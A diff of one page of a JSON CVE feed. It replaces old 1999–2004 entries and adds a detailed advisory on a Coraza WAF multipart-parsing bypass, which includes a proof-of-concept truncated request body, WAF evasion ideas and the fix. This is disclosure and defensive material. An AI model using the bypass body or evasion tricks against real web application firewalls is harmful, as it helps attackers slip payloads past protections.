@@ -1,913 +1,898 @@
 {
   "version": "1.0",
-  "lastUpdated": "2026-11-25",
+  "lastUpdated": "2026-11-26",
   "source": "CIRCL CVE Search + GitHub Advisory OSV + CISA KEV + NIST NVD",
   "pagination": {
     "page": 238,
     "pageSize": 50,
     "totalPages": 290,
-    "totalItems": 14483,
+    "totalItems": 14490,
     "hasNextPage": true,
     "hasPrevPage": true
   },
   "cves": [
     {
-      "id": "CVE-2000-0252",
-      "summary": "The dansie shopping cart application cart.pl allows remote attackers to execute commands via a shell metacharacters in a form variable.",
+      "id": "CVE-2026-41508",
+      "summary": "## Root Cause\n\nFile: `internal/bodyprocessors/multipart.go` (since commit `3347961b`, PR #1453 *\"feat: ignore unexpected EOF in MIME multipart request body processor\"*, merged 2026-03-06, first shipped in `v3.4.0`).\n\nThe multipart body processor treats `io.ErrUnexpectedEOF` as a benign condition. Three sites are affected; all mishandle the error the same way.\n\n### File branch, filesystem-backed (lines 71–77)\n\n```go\nsz, err := io.Copy(temp, p)\nif err != nil {\n    if !errors.Is(err, io.ErrUnexpectedEOF) {\n        v.MultipartStrictError().(*collections.Single).Set(\"1\")\n        return err\n    }\n    seenUnexpectedEOF = true     // <-- flag never set for UnexpectedEOF\n}\n```\n\n### File branch, TinyGo path (lines 82–88)\n\n```go\nsz, err := io.Copy(io.Discard, p)\nif err != nil {\n    if !errors.Is(err, io.ErrUnexpectedEOF) {\n        v.MultipartStrictError().(*collections.Single).Set(\"1\")\n        return err\n    }\n    seenUnexpectedEOF = true     // <-- same gap\n}\n```\n\n### Field branch (lines 102–113)\n\n```go\ndata, err := io.ReadAll(p)\nif err != nil {\n    if !errors.Is(err, io.ErrUnexpectedEOF) {\n        v.MultipartStrictError().(*collections.Single).Set(\"1\")\n        return err\n    }\n}\n...\nif errors.Is(err, io.ErrUnexpectedEOF) {\n    break                         // <-- exits loop with no flag set\n}\n```\n\nThe function then returns `nil` at line 116 for any body that ended prematurely. Consequences:\n\n1. `MULTIPART_STRICT_ERROR` stays at its initial value `0`.\n2. `REQBODY_ERROR` is not propagated either (since `ProcessRequest` returns `nil`).\n3. Neither of the two canonical defensive rules shipped in `coraza.conf-recommended` fires:\n   ```conf\n   SecRule REQBODY_ERROR \"!@eq 0\" \"id:200002,phase:2,deny,status:400,...\"\n   SecRule MULTIPART_STRICT_ERROR \"!@eq 0\" \"id:200003,phase:2,deny,status:400,...\"\n   ```\n\nAll other error branches in the same function (lines 27, 48, 66, 84, 104) correctly set `MULTIPART_STRICT_ERROR` before returning; this is an inconsistency introduced in #1453, not a systemic issue.\n\n## Context — why the error is swallowed\n\nPR #1453 was introduced to support `SecRequestBodyLimitAction ProcessPartial`: when a body is cut off because it hit the configured request-body limit, the parser should still surface the parts it did receive. The PR legitimately needs to avoid `return err` on `ErrUnexpectedEOF`. But it also silenced the strict-error flag, which is the wrong compromise — the flag is exactly how operators observe that something was incomplete. The fix should keep the non-fatal `break` and still set `MULTIPART_STRICT_ERROR`, letting the operator decide (via rule 200003 or their own policy) whether partial processing is acceptable.\n\n## Impact\n\nRule 200003 is Coraza's blanket defense against **multipart parser-inconsistency evasions** — attack classes where the body is crafted so Coraza's Go `mime/multipart` reader and the backend's multipart parser (PHP, Node, Java, legacy libmodsecurity, etc.) disagree about where fields start or end. The rule fails-closed on *any* malformed body, so the operator does not need to enumerate every parser-disagreement trick. That defense is now void for any evasion that also truncates the body.\n\nExamples of what becomes reachable:\n\n- Smuggling a second field past the truncation boundary that the backend's more permissive parser still extracts.\n- Hiding payload bytes after a deliberately malformed `Content-Disposition` header that the Go parser refuses but the backend accepts.\n- Generic CRS evasion chains that depend on rule 200003 as a catch-all.\n\nThe fix is tiny and low-risk. The impact is disproportionately large because rule 200003 is the *only* defense-in-depth rule for multipart in the recommended config — there is no secondary signal.\n\n## Proof of Concept\n\nStart a Coraza-wrapped HTTP server shipping the canonical defensive rules from `coraza.conf-recommended`:\n\n```conf\nSecRuleEngine On\nSecRequestBodyAccess On\nSecRule REQBODY_ERROR \"!@eq 0\" \\\n    \"id:200002,phase:2,t:none,log,deny,status:400,msg:'Failed to parse request body.'\"\nSecRule MULTIPART_STRICT_ERROR \"!@eq 0\" \\\n    \"id:200003,phase:2,t:none,log,deny,status:400,msg:'Multipart strict validation failed.'\"\n```\n\nThree real-curl requests against the listener:\n\n| # | Body | Expected (with rule 200003) | Observed |\n|---|---|---|---|\n| 1 | Well-formed `field1=benign` + closing boundary | HTTP 200 | HTTP 200 (baseline) |\n| 2 | Two parts, **no closing boundary** (`...MALFORMED_NO_TRAILING_BOUNDARY`) | HTTP 400 | **HTTP 200** |\n| 3 | Mid-part cutoff: `name=\"x\"\\r\\n\\r\\nabc` (no `\\r\\n`, no boundary) | HTTP 400 | **HTTP 200** |\n\nServer-side match log is empty for cases 2 and 3: neither rule 200002 nor rule 200003 fires. Example (case 2):\n\n```\n--PoCBoundary12345\\r\\n\nContent-Disposition: form-data; name=\"field1\"\\r\\n\\r\\n\nbenign\\r\\n\n--PoCBoundary12345\\r\\n\nContent-Disposition: form-data; name=\"truncated\"\\r\\n\\r\\n\nMALFORMED_NO_TRAILING_BOUNDARY\n```\n→ `HTTP 200`, no audit record, transaction.variables.multipartStrictError == 0.\n\n## Mitigation\n\nA two-line change per site in `internal/bodyprocessors/multipart.go`:\n\n```go\nif errors.Is(err, io.ErrUnexpectedEOF) {\n    v.MultipartStrictError().(*collections.Single).Set(\"1\")\n    seenUnexpectedEOF = true   // keep existing break semantics\n}\n```\n\nApply at the three sites (lines 71–77, 82–88, 102–113 in the current code). No change to the `return err` control flow is needed — the fix only adds the flag-setter alongside the existing `seenUnexpectedEOF = true` / `break` path. PR #1453's ProcessPartial goal is preserved.\n\nOperators running in `ProcessPartial` mode who intentionally allow truncated bodies should pair this with a config-level change (downgrade rule 200003 to detection-only, or scope it with a secondary check on whether `SecRequestBodyLimit` was actually hit). The engine change above is safe by default — it restores the invariant that malformed multipart always raises `MULTIPART_STRICT_ERROR`.\n\n## Affected versions\n\nIntroduced in PR #1453 (commit `3347961b`, merged 2026-03-06). First released in `v3.4.0` and still present on `main` at `599ae64a`.\n\nAffected: `>= 3.4.0, <= 3.7.0`.\n\nReleases prior to `v3.4.0` returned `err` on `io.ErrUnexpectedEOF` and so `REQBODY_ERROR` would propagate via rule 200002 even if `MULTIPART_STRICT_ERROR` was not set — a different (arguably stricter) behavior that did not exhibit this bypass.\n\n## References\n\n- `internal/bodyprocessors/multipart.go` lines 70–113\n- `coraza.conf-recommended` rule `id:200003` (`MULTIPART_STRICT_ERROR`)\n- PR #1453 — introduction of `ErrUnexpectedEOF` swallowing\n- `coraza.conf-recommended` rule `id:200002` (`REQBODY_ERROR`) — also not raised because `ProcessRequest` returns `nil`",
+      "cvssScore": 5.8,
+      "severity": "Medium",
+      "published": "2026-10-06",
+      "modified": "2026-10-06",
+      "cwe": {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      },
+      "references": [
+        "https://github.com/corazawaf/coraza/security/advisories/GHSA-r3rm-qphw-hh76",
+        "https://github.com/corazawaf/coraza/commit/f94c81bec209f658120c418448d0590a549b71df",
+        "https://github.com/corazawaf/coraza/releases/tag/v3.8.0",
+        "https://github.com/advisories/GHSA-r3rm-qphw-hh76"
+      ],
+      "vulnerableProducts": [
+        "github.com/corazawaf/coraza/v3 go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0588",
+      "summary": "SawMill 5.0.21 CGI program allows remote attackers to read the first line of arbitrary files by listing the file in the rfcf parameter, whose contents SawMill attempts to parse as configuration commands.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2000-04-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-04/0051.html",
-        "http://www.securityfocus.com/bid/1115",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4975",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-04/0051.html",
-        "http://www.securityfocus.com/bid/1115"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0253",
-      "summary": "The dansie shopping cart application cart.pl allows remote attackers to modify sensitive purchase information via hidden form fields.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2000-04-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/1115",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4621",
-        "http://www.securityfocus.com/bid/1115",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4621"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0258",
-      "summary": "IIS 4.0 and 5.0 allows remote attackers to cause a denial of service by sending many URLs with a large number of escaped characters, aka the \"Myriad Escaped Characters\" Vulnerability.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2000-04-12",
-      "modified": null,
-      "cwe": "CWE-20",
-      "references": [
-        "http://www.securityfocus.com/bid/1101",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-023",
-        "http://www.securityfocus.com/bid/1101",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-023"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0259",
-      "summary": "The default permissions for the Cryptography\\Offload registry key used by the OffloadModExpo in Windows NT 4.0 allows local users to obtain compromise the cryptographic keys of other users.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2000-04-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/1105",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-024",
-        "http://www.securityfocus.com/bid/1105",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-024"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2090",
-      "summary": "Microsoft Internet Explorer 5.0.1 through 6.0 allows remote attackers to determine the existence of arbitrary files via the VBScript LoadPicture method, which returns an error code if the file does not exist.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-02-07",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-February/016881.html",
-        "http://secunia.com/advisories/10820",
-        "http://www.securityfocus.com/bid/9611",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15078",
-        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-February/016881.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1244",
-      "summary": "Windows Media Player 9 allows remote attackers to execute arbitrary code via a PNG file containing large (1) width or (2) height values, aka the \"PNG Processing Vulnerability.\"",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-02-08",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.kb.cert.org/vuls/id/259890",
-        "http://www.us-cert.gov/cas/techalerts/TA05-039A.html",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2005/ms05-009",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/19096",
-        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A1306"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0461",
-      "summary": "The DHCP daemon (DHCPD) for ISC DHCP 3.0.1rc12 and 3.0.1rc13, when compiled in environments that do not provide the vsnprintf function, uses C include files that define vsnprintf to use the less safe vsprintf function, which can lead to buffer overflow vulnerabilities that enable a denial of service (server crash) and possibly execute arbitrary code.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2004-08-06",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=108795911203342&w=2",
-        "http://marc.info/?l=bugtraq&m=108843959502356&w=2",
-        "http://marc.info/?l=bugtraq&m=108938625206063&w=2",
-        "http://secunia.com/advisories/23265",
-        "http://www.kb.cert.org/vuls/id/654390"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0492",
-      "summary": "Heap-based buffer overflow in proxy_util.c for mod_proxy in Apache 1.3.25 to 1.3.31 allows remote attackers to cause a denial of service (process crash) and possibly execute arbitrary code via a negative Content-Length HTTP header field, which causes a large amount of data to be copied.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2004-08-06",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://patches.sgi.com/support/free/security/advisories/20040605-01-U.asc",
-        "http://marc.info/?l=bugtraq&m=108711172710140&w=2",
-        "http://marc.info/?l=bugtraq&m=130497311408250&w=2",
-        "http://rhn.redhat.com/errata/RHSA-2004-245.html",
-        "http://seclists.org/lists/fulldisclosure/2004/Jun/0296.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-1204",
-      "summary": "Directory traversal vulnerability in phprocketaddin in Total PC Solutions PHP Rocket Add-in for FrontPage 1.0 allows remote attackers to read arbitrary files via a .. (dot dot) in the page parameter.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2001-12-28",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/archive/1/247559",
-        "http://www.securityfocus.com/bid/3751",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7749",
-        "http://www.securityfocus.com/archive/1/247559",
-        "http://www.securityfocus.com/bid/3751"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1250",
-      "summary": "Efficient Networks 5861 DSL router, when running firmware 5.3.80 configured to block incoming TCP SYN, packets allows remote attackers to cause a denial of service (crash) via a flood of TCP SYN packets to the WAN interface using a port scanner such as nmap.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0015.html",
-        "http://securitytracker.com/id?1005980",
-        "http://www.iss.net/security_center/static/11032.php",
-        "http://www.securityfocus.com/archive/1/306081",
-        "http://www.securityfocus.com/archive/1/308008"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1251",
-      "summary": "The (1) menu.inc.php, (2) datasets.php and (3) mass_operations.inc.php (mistakenly referred to as mass_opeations.inc.php) scripts in N/X 2002 allow remote attackers to execute arbitrary PHP code via a c_path that references a URL on a remote web server that contains the code.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2003-01/0005.html",
-        "http://secunia.com/advisories/7808",
-        "http://www.iss.net/security_center/static/10969.php",
-        "http://www.securityfocus.com/bid/6500",
-        "http://archives.neohapsis.com/archives/bugtraq/2003-01/0005.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1252",
-      "summary": "register.php in S8Forum 3.0 allows remote attackers to execute arbitrary PHP commands by creating a user whose name ends in a .php extension and entering the desired commands into the E-mail field, which creates a web-accessible .php file that can be called by the attacker, as demonstrated using a \"system($cmd)\" E-mail address with a \"any_name.php\" username.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0004.html",
-        "http://secunia.com/advisories/7819",
-        "http://www.iss.net/security_center/static/10974.php",
-        "http://www.securityfocus.com/archive/1/305406",
-        "http://www.securityfocus.com/bid/6547"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0221",
-      "summary": "The (1) dupatch and (2) setld utilities in HP Tru64 UNIX 5.1B PK1 and earlier allows local users to overwrite files and possibly gain root privileges via a symlink attack.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2003-05-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.ciac.org/ciac/bulletins/n-086.shtml",
-        "http://www.securityfocus.com/bid/7452",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11892",
-        "http://www.ciac.org/ciac/bulletins/n-086.shtml",
-        "http://www.securityfocus.com/bid/7452"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0222",
-      "summary": "Stack-based buffer overflow in Oracle Net Services for Oracle Database Server 9i release 2 and earlier allows attackers to execute arbitrary code via a \"CREATE DATABASE LINK\" query containing a connect string with a long USING parameter.",
-      "cvssScore": 9,
-      "severity": "Critical",
-      "published": "2003-05-12",
-      "modified": null,
-      "cwe": "CWE-119",
-      "references": [
-        "http://marc.info/?l=bugtraq&m=105162831008176&w=2",
-        "http://marc.info/?l=ntbugtraq&m=105163376015735&w=2",
-        "http://otn.oracle.com/deploy/security/pdf/2003alert54.pdf",
-        "http://www.ciac.org/ciac/bulletins/n-085.shtml",
-        "http://www.securityfocus.com/bid/7453"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0391",
-      "summary": "The cryptographic challenge of SMB authentication in Windows 95 and Windows 98 can be reused, allowing an attacker to replay the response and impersonate a user.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "1999-01-05",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://marc.info/?l=bugtraq&m=91552769809542&w=2",
-        "https://marc.info/?l=bugtraq&m=91552769809542&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1264",
-      "summary": "WebRamp M3 router does not disable remote telnet or HTTP access to itself, even when access has been explicitly disabled.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "1999-01-21",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=91815321510224&w=2",
-        "http://www.securityfocus.com/archive/1/12048",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1670",
-        "http://marc.info/?l=bugtraq&m=91815321510224&w=2",
-        "http://www.securityfocus.com/archive/1/12048"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0674",
-      "summary": "ftp.pl CGI program for Virtual Visions FTP browser allows remote attackers to read directories outside of the document root via a .. (dot dot) attack.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-07-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0177.html",
-        "http://www.securityfocus.com/bid/1471",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5187",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0177.html",
-        "http://www.securityfocus.com/bid/1471"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0649",
-      "summary": "IIS 4.0 allows remote attackers to obtain the internal IP address of the server via an HTTP 1.0 request for a web page which is protected by basic authentication and has no realm defined.",
-      "cvssScore": 2.6,
-      "severity": "Low",
-      "published": "2000-07-13",
+      "published": "2000-06-26",
       "modified": null,
       "cwe": "CWE-200",
       "references": [
-        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0025.html",
-        "http://www.securityfocus.com/bid/1499",
-        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0025.html",
-        "http://www.securityfocus.com/bid/1499"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-06/0271.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0080.html",
+        "http://www.securityfocus.com/bid/1402",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-06/0271.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0080.html"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-1653",
-      "summary": "The default configuration for OpenSSH enables AllowTcpForwarding, which could allow remote authenticated users to perform a port bounce, when configured with an anonymous access program such as AnonCVS.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
-      "published": "2004-08-31",
+      "id": "CVE-2000-0589",
+      "summary": "SawMill 5.0.21 uses weak encryption to store passwords, which allows attackers to easily decrypt the password and modify the SawMill configuration.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2000-06-26",
+      "modified": null,
+      "cwe": "CWE-310",
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-06/0271.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0080.html",
+        "http://www.securityfocus.com/bid/1403",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-06/0271.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0080.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0996",
+      "summary": "Multiple buffer overflows in Novell NetMail (NIMS) 3.0.3 before 3.0.3C allows remote attackers to cause a denial of service and possibly execute arbitrary code via (1) WebAdmin or (2) ModWeb.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-04",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=109413637313484&w=2",
-        "http://securitytracker.com/id?1011143",
-        "http://www.osvdb.org/9562",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17213",
-        "https://security.netapp.com/advisory/ntap-20191107-0001/"
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0153.html",
+        "http://support.novell.com/servlet/tidfinder/2963051",
+        "http://www.iss.net/security_center/static/9560.php",
+        "http://www.securityfocus.com/bid/5230",
+        "http://www.securityfocus.com/bid/5231"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0943",
-      "summary": "MetaCart2.sql stores the user database under the web document root without access controls, which allows remote attackers to obtain sensitive information such as passwords and credit card numbers via a direct request for metacart.mdb.",
-      "cvssScore": 6.4,
+      "id": "CVE-2000-1090",
+      "summary": "Microsoft IIS for Far East editions 4.0 and 5.0 allows remote attackers to read source code for parsed pages via a malformed URL that uses the lead-byte of a double-byte character.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.nsfocus.com/english/homepage/sa_08.htm",
+        "http://www.securityfocus.com/bid/2100",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5729",
+        "http://www.nsfocus.com/english/homepage/sa_08.htm",
+        "http://www.securityfocus.com/bid/2100"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0003",
+      "summary": "Web Extender Client (WEC) in Microsoft Office 2000, Windows 2000, and Windows Me does not properly process Internet Explorer security settings for NTLM authentication, which allows attackers to obtain NTLM credentials and possibly obtain the password, aka the \"Web Client NTLM Authentication\" vulnerability.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/2199",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-001",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5920",
+        "http://www.securityfocus.com/bid/2199",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-001"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1258",
+      "summary": "rpc.pwdauthd in SunOS 4.1.1 and earlier does not properly prevent remote access to the daemon, which allows remote attackers to obtain sensitive system information.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1991-01-15",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/102",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1782",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/102",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1782"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0312",
+      "summary": "HP ypbind allows attackers with root privileges to modify NIS data.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1993-01-13",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0312",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0312"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0211",
+      "summary": "Extra long export lists over 256 characters in some mount daemons allows NFS directories to be mounted by anyone.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1994-02-14",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/24",
+        "https://vuls.cert.org/confluence/pages/viewpage.action?pageId=96665790",
+        "https://vuls.cert.org/confluence/pages/viewpage.action?pageId=97124517",
+        "https://vuls.cert.org/confluence/pages/viewpage.action?pageId=97124527",
+        "http://www.securityfocus.com/bid/24"
+      ],
+      "vulnerableProducts": [
+        "unknown"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1044",
+      "summary": "editproducts.cgi in Bugzilla 2.16.3 and earlier, when usebuggroups is enabled, does not properly remove group add privileges from a group that is being deleted, which allows users with those privileges to perform unauthorized additions to the next group that is assigned with the original group ID.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-08-18",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://bugzilla.mozilla.org/show_bug.cgi?id=219690",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000774",
+        "http://www.securityfocus.com/archive/1/343185",
+        "http://www.securityfocus.com/bid/8953",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/13597"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0921",
+      "summary": "Netscape 4.79 and earlier for MacOS allows an attacker with access to the browser to obtain passwords from form fields by printing the document into which the password has been typed, which is printed in cleartext.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-11-21",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=100638816318705&w=2",
+        "http://www.osvdb.org/5524",
+        "http://www.securityfocus.com/bid/3565",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7593",
+        "http://marc.info/?l=bugtraq&m=100638816318705&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0913",
+      "summary": "Format string vulnerability in Network Solutions Rwhoisd 1.5.7.2 and earlier, when using syslog, allows remote attackers to corrupt memory and possibly execute arbitrary code via a rwhois request that contains format specifiers.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-11-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://lists.research.netsol.com/pipermail/rwhois-announce/2001-November/000023.html",
+        "http://marc.info/?l=bugtraq&m=100655265508104&w=2",
+        "http://lists.research.netsol.com/pipermail/rwhois-announce/2001-November/000023.html",
+        "http://marc.info/?l=bugtraq&m=100655265508104&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0917",
+      "summary": "Jakarta Tomcat 4.0.1 allows remote attackers to reveal physical path information by requesting a long URL with a .JSP extension.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-11-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=100654722925155&w=2",
+        "http://marc.info/?l=tomcat-dev&m=100658457507305&w=2",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7599",
+        "https://lists.apache.org/thread.html/29dc6c2b625789e70a9c4756b5a327e6547273ff8bde7e0327af48c5%40%3Cdev.tomcat.apache.org%3E",
+        "https://lists.apache.org/thread.html/c62b0e3a7bf23342352a5810c640a94b6db69957c5c19db507004d74%40%3Cdev.tomcat.apache.org%3E"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0918",
+      "summary": "Vulnerabilities in CGI scripts in susehelp in SuSE 7.2 and 7.3 allow remote attackers to execute arbitrary commands by not opening files securely.",
+      "cvssScore": 5.1,
+      "severity": "Medium",
+      "published": "2001-11-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.novell.com/linux/security/advisories/2001_041_susehelp_txt.html",
+        "http://www.securityfocus.com/bid/3576",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7583",
+        "http://www.novell.com/linux/security/advisories/2001_041_susehelp_txt.html",
+        "http://www.securityfocus.com/bid/3576"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1072",
+      "summary": "ZyXEL Prestige 642R 2.50(FA.1) and Prestige 310 V3.25(M.01), allows remote attackers to cause a denial of service via an oversized, fragmented \"jolt\" style ICMP packet.",
+      "cvssScore": 5,
       "severity": "Medium",
       "published": "2002-10-04",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-06/0200.html",
-        "http://www.iss.net/security_center/static/9393.php",
-        "http://www.securityfocus.com/bid/5042",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-06/0200.html",
-        "http://www.iss.net/security_center/static/9393.php"
